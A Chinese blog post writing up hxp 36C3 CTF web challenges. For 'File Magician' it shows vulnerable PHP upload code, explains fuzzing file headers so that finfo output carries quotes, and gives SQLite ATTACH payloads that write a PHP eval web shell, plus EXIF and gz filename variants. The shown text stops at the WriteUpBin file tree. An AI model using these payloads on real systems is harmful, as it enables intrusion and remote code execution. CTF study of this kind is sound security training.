<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言hxp 363c ctf的题目还是比较好的因此总结了一下。 0x01 FILE Magician12345678910111213Difficulty estimate: easySolved:133/321Points: round(1000 · min(1, 10 / (9 + [133 solves]))) = 70 pointsDescription:Finally (again),">
<meta property="og:type" content="article">
<meta property="og:title" content="hxp 36c3 ctf Web 学习记录">
<meta property="og:url" content="http://yoursite.com/2020/01/15/hxp-36c3-ctf-Web-学习记录/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言hxp 363c ctf的题目还是比较好的因此总结了一下。 0x01 FILE Magician12345678910111213Difficulty estimate: easySolved:133/321Points: round(1000 · min(1, 10 / (9 + [133 solves]))) = 70 pointsDescription:Finally (again),">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-10.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-11.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-12.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-2.png">
<meta property="og:updated_time" content="2020-01-15T03:35:12.328Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hxp 36c3 ctf Web 学习记录">
<meta name="twitter:description" content="前言hxp 363c ctf的题目还是比较好的因此总结了一下。 0x01 FILE Magician12345678910111213Difficulty estimate: easySolved:133/321Points: round(1000 · min(1, 10 / (9 + [133 solves]))) = 70 pointsDescription:Finally (again),">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-3.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/01/15/hxp-36c3-ctf-Web-学习记录/">





  <title>hxp 36c3 ctf Web 学习记录 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/hxp-36c3-ctf-Web-学习记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">hxp 36c3 ctf Web 学习记录</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-15T11:33:52+08:00">
                2020-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php-web/" itemprop="url" rel="index">
                    <span itemprop="name">php-web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  6.3k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  28
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>hxp 363c ctf的题目还是比较好的因此总结了一下。</p>
<h5 id="0x01-FILE-Magician"><a href="#0x01-FILE-Magician" class="headerlink" title="0x01 FILE Magician"></a>0x01 FILE Magician</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Difficulty estimate: easy</span><br><span class="line"></span><br><span class="line">Solved:133/321</span><br><span class="line"></span><br><span class="line">Points: round(1000 · min(1, 10 / (9 + [133 solves]))) = 70 points</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Finally (again), a minimalistic, open-source file hosting solution.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz</span><br></pre></td></tr></table></figure>

<h6 id="这道题与其他两道相比算是比较简单的一个了，题目直接给出Docker文件源代码，源代码如下："><a href="#这道题与其他两道相比算是比较简单的一个了，题目直接给出Docker文件源代码，源代码如下：" class="headerlink" title="这道题与其他两道相比算是比较简单的一个了，题目直接给出Docker文件源代码，源代码如下："></a>这道题与其他两道相比算是比较简单的一个了，题目直接给出Docker文件源代码，源代码如下：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_startup_errors'</span>, <span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ! <span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = bin2hex(random_bytes(<span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="string">'/var/www/html/files/'</span>.$_SESSION[<span class="string">'id'</span>] . <span class="string">'/'</span>;</span><br><span class="line">@mkdir($d, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">chdir($d) || <span class="keyword">die</span>(<span class="string">'chdir'</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:'</span> . $d . <span class="string">'db.sqlite3'</span>);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;exec(<span class="string">'CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]) &amp;&amp; $_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &lt; <span class="number">10</span>*<span class="number">1024</span> )&#123;</span><br><span class="line">    $s = <span class="string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="keyword">new</span> finfo)-&gt;file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]). <span class="string">" ');"</span>;</span><br><span class="line">    $db-&gt;exec($s);</span><br><span class="line">    move_uploaded_file( $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="keyword">die</span>(<span class="string">'move_upload_file'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploads = [];</span><br><span class="line">$sql = <span class="string">'SELECT * FROM upload'</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($db-&gt;query($sql) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">    $uploads[] = [$row[<span class="string">'id'</span>], $row[<span class="string">'info'</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;file magician&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($uploads <span class="keyword">as</span> $upload):<span class="meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="string">"&lt;?= '/files/' . $_SESSION['id'] . '/' . $upload[0] ?&gt;"</span>&gt;<span class="meta">&lt;?</span>= $upload[<span class="number">0</span>] <span class="meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?</span>= $upload[<span class="number">1</span>] <span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h6 id="题目的功能点就是一个简单的文件上传，然后在自己的sandbox当中看到自己的文件类型，文件类型是由-new-finfo-gt-file来判断的，还使用了sqlite进行存储文件上传的记录。"><a href="#题目的功能点就是一个简单的文件上传，然后在自己的sandbox当中看到自己的文件类型，文件类型是由-new-finfo-gt-file来判断的，还使用了sqlite进行存储文件上传的记录。" class="headerlink" title="题目的功能点就是一个简单的文件上传，然后在自己的sandbox当中看到自己的文件类型，文件类型是由(new finfo)-&gt;file来判断的，还使用了sqlite进行存储文件上传的记录。"></a>题目的功能点就是一个简单的文件上传，然后在自己的sandbox当中看到自己的文件类型，文件类型是由<code>(new finfo)-&gt;file</code>来判断的，还使用了sqlite进行存储文件上传的记录。</h6><h6 id="由于创建的数据库规定了id为自增长的整型为主键，而且它使用了lastInsertId-返回最后一次insert数据的id作为文件名"><a href="#由于创建的数据库规定了id为自增长的整型为主键，而且它使用了lastInsertId-返回最后一次insert数据的id作为文件名" class="headerlink" title="由于创建的数据库规定了id为自增长的整型为主键，而且它使用了lastInsertId()返回最后一次insert数据的id作为文件名"></a>由于创建的数据库规定了id为自增长的整型为主键，而且它使用了<code>lastInsertId()</code>返回最后一次insert数据的id作为文件名</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">move_uploaded_file( $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="keyword">die</span>(<span class="string">'move_upload_file'</span>);</span><br></pre></td></tr></table></figure>

<h6 id="所以我们基本上可以不用考虑是否存在通过可控文件名上传文件getshell了。"><a href="#所以我们基本上可以不用考虑是否存在通过可控文件名上传文件getshell了。" class="headerlink" title="所以我们基本上可以不用考虑是否存在通过可控文件名上传文件getshell了。"></a>所以我们基本上可以不用考虑是否存在通过可控文件名上传文件getshell了。</h6><h6 id="纵观整个文件，其实我们可以发现，我们可控的输入点也只有在文件类型当中，文件类型又被拼入到了sql语句当中"><a href="#纵观整个文件，其实我们可以发现，我们可控的输入点也只有在文件类型当中，文件类型又被拼入到了sql语句当中" class="headerlink" title="纵观整个文件，其实我们可以发现，我们可控的输入点也只有在文件类型当中，文件类型又被拼入到了sql语句当中"></a>纵观整个文件，其实我们可以发现，我们可控的输入点也只有在文件类型当中，文件类型又被拼入到了sql语句当中</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="keyword">new</span> finfo)-&gt;file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]). <span class="string">" ');"</span>;</span><br></pre></td></tr></table></figure>

<h6 id="所以比较明显，我们只能通过这个来进行sql注入来进行一波操作了。"><a href="#所以比较明显，我们只能通过这个来进行sql注入来进行一波操作了。" class="headerlink" title="所以比较明显，我们只能通过这个来进行sql注入来进行一波操作了。"></a>所以比较明显，我们只能通过这个来进行sql注入来进行一波操作了。</h6><h6 id="参考的思路就是fuzz一些特殊的文件，可能存在某些文件使用finfo得出的结果含有单引号什么的，并且我们还能够插入可控数据，于是我们就开始fuzz文件头，从0x00到0xff0xff。"><a href="#参考的思路就是fuzz一些特殊的文件，可能存在某些文件使用finfo得出的结果含有单引号什么的，并且我们还能够插入可控数据，于是我们就开始fuzz文件头，从0x00到0xff0xff。" class="headerlink" title="参考的思路就是fuzz一些特殊的文件，可能存在某些文件使用finfo得出的结果含有单引号什么的，并且我们还能够插入可控数据，于是我们就开始fuzz文件头，从0x00到0xff0xff。"></a>参考的思路就是fuzz一些特殊的文件，可能存在某些文件使用<code>finfo</code>得出的结果含有单引号什么的，并且我们还能够插入可控数据，于是我们就开始fuzz文件头，从<code>0x00</code>到<code>0xff0xff</code>。</h6><h6 id="终于在0x1f0x9d得到一个文件类型是compress-39-d-data，虽然有单引号，但是不存在我们可控的数据。"><a href="#终于在0x1f0x9d得到一个文件类型是compress-39-d-data，虽然有单引号，但是不存在我们可控的数据。" class="headerlink" title="终于在0x1f0x9d得到一个文件类型是compress&#39;d data，虽然有单引号，但是不存在我们可控的数据。"></a>终于在<code>0x1f0x9d</code>得到一个文件类型是<code>compress&#39;d data</code>，虽然有单引号，但是不存在我们可控的数据。</h6><h6 id="还有一个是0xfb0x01得到一个文件类型是QDOS-object-39-39-，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下"><a href="#还有一个是0xfb0x01得到一个文件类型是QDOS-object-39-39-，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下" class="headerlink" title="还有一个是0xfb0x01得到一个文件类型是QDOS object&#39;&#39;，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下"></a>还有一个是<code>0xfb0x01</code>得到一个文件类型是<code>QDOS object&#39;&#39;</code>，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-3.png" alt></p>
<h6 id="发现这里被吃掉了一个p，于是我们调整一下-payload-就可以用来注入了。"><a href="#发现这里被吃掉了一个p，于是我们调整一下-payload-就可以用来注入了。" class="headerlink" title="发现这里被吃掉了一个p，于是我们调整一下 payload 就可以用来注入了。"></a>发现这里被吃掉了一个p，于是我们调整一下 payload 就可以用来注入了。</h6><h6 id="sqlite是可以用-php文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过sqlite-attach一个z-php的方法来写shell了。"><a href="#sqlite是可以用-php文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过sqlite-attach一个z-php的方法来写shell了。" class="headerlink" title="sqlite是可以用.php文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过sqlite attach一个z.php的方法来写shell了。"></a>sqlite是可以用.php文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过sqlite attach一个z.php的方法来写shell了。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;create TABLE t.e (d text);/*</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;insert INTO t.e (d) VALUES (&apos;&lt;?php eval($_POST[a])?&gt;&apos;);/*</span><br></pre></td></tr></table></figure>

<h6 id="这里可能需要注意的就是有长度限制，所以我们需要分两次来写-shell"><a href="#这里可能需要注意的就是有长度限制，所以我们需要分两次来写-shell" class="headerlink" title="这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell"></a>这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-4.png" alt></p>
<h6 id="other-file"><a href="#other-file" class="headerlink" title="other file"></a>other file</h6><h6 id="看其他选手的公开的-wp-也是很有趣的一件事，然后从-ctftime-上公开的-wp，我们可以发现还存在着这么一些文件可以用来注入。"><a href="#看其他选手的公开的-wp-也是很有趣的一件事，然后从-ctftime-上公开的-wp，我们可以发现还存在着这么一些文件可以用来注入。" class="headerlink" title="看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。"></a>看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。</h6><h6 id="TeX-DVI-file"><a href="#TeX-DVI-file" class="headerlink" title="TeX DVI file"></a>TeX DVI file</h6><h6 id="0xf702文件头，在填充一定数据后有我们安全可控的数据"><a href="#0xf702文件头，在填充一定数据后有我们安全可控的数据" class="headerlink" title="0xf702文件头，在填充一定数据后有我们安全可控的数据"></a>0xf702文件头，在填充一定数据后有我们安全可控的数据</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-5.png" alt></p>
<h6 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h6><h6 id="在-jpeg-的-EXIF-数据段中有用来标识-software-的数据也是我们可控的地方，同样用来标识-comment-的地方我们也可控。于是我们可以使用-exiftool-来修改图片。"><a href="#在-jpeg-的-EXIF-数据段中有用来标识-software-的数据也是我们可控的地方，同样用来标识-comment-的地方我们也可控。于是我们可以使用-exiftool-来修改图片。" class="headerlink" title="在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。"></a>在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=&quot;payload&quot; -software=&quot;payload2&quot; 1.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-6.png" alt></p>
<h6 id><a href="#" class="headerlink" title="#!"></a>#!</h6><h6 id="我们还可以利用-的文件来构造payload"><a href="#我们还可以利用-的文件来构造payload" class="headerlink" title="我们还可以利用#!/的文件来构造payload"></a>我们还可以利用<code>#!/</code>的文件来构造payload</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-7.png" alt></p>
<h6 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h6><h6 id="利用gunzip生成的gz文件，我们也可以用来注入，我们可控的数据是它的文件名"><a href="#利用gunzip生成的gz文件，我们也可以用来注入，我们可控的数据是它的文件名" class="headerlink" title="利用gunzip生成的gz文件，我们也可以用来注入，我们可控的数据是它的文件名"></a>利用<code>gunzip</code>生成的gz文件，我们也可以用来注入，我们可控的数据是它的文件名</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-8.png" alt></p>
<h6 id="当然我们也可以直接修改gz文件的内容"><a href="#当然我们也可以直接修改gz文件的内容" class="headerlink" title="当然我们也可以直接修改gz文件的内容"></a>当然我们也可以直接修改gz文件的内容</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-9.png" alt></p>
<h5 id="0x02-WriteUpBin"><a href="#0x02-WriteUpBin" class="headerlink" title="0x02 WriteUpBin"></a>0x02 WriteUpBin</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Difficulty estimate: medium</span><br><span class="line"></span><br><span class="line">Solved:13/321</span><br><span class="line"></span><br><span class="line">Points: round(1000 · min(1, 10 / (9 + [13 solves]))) = 455 points</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Finally (again), a minimalistic, open-source social writeup hosting solution.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz</span><br></pre></td></tr></table></figure>

<h6 id="一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag-存放在数据库当中，并且是在-admin-用户的第一条-writeup-数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给-admin-，让-admin-给你点赞。"><a href="#一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag-存放在数据库当中，并且是在-admin-用户的第一条-writeup-数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给-admin-，让-admin-给你点赞。" class="headerlink" title="一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。"></a>一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。</h6><h6 id="项目的结构如下："><a href="#项目的结构如下：" class="headerlink" title="项目的结构如下："></a>项目的结构如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile							//Docker文件</span><br><span class="line">├── admin.py								//使用selenium模拟admin登录并点赞</span><br><span class="line">├── db.sql									//数据库文件</span><br><span class="line">├── docker-stuff</span><br><span class="line">│   ├── default							//配置文件</span><br><span class="line">│   └── www.conf						//配置文件</span><br><span class="line">├── www</span><br><span class="line">│   ├── general.php					//连接数据库设置header头等一些初始化操作</span><br><span class="line">│   ├── html</span><br><span class="line">│   │   ├── add.php					//添加writeup相关操作</span><br><span class="line">│   │   ├── admin.php				//把writeup提交给admin</span><br><span class="line">│   │   ├── index.php				//入口文件</span><br><span class="line">│   │   ├── like.php				//点赞操作</span><br><span class="line">│   │   ├── login_admin.php	//admin登陆操作</span><br><span class="line">│   │   └── show.php				//获取writeup内容</span><br><span class="line">│   └── views</span><br><span class="line">│       ├── header.php			//在页面上方展示目前id提交的writeup</span><br><span class="line">│       ├── home.php				//页面中部用来提供给用户输入的界面</span><br><span class="line">│       └── show.php				//点赞、提交给admin的展示页面</span><br><span class="line">└── ynetd										//用来启动 admin.py</span><br></pre></td></tr></table></figure>

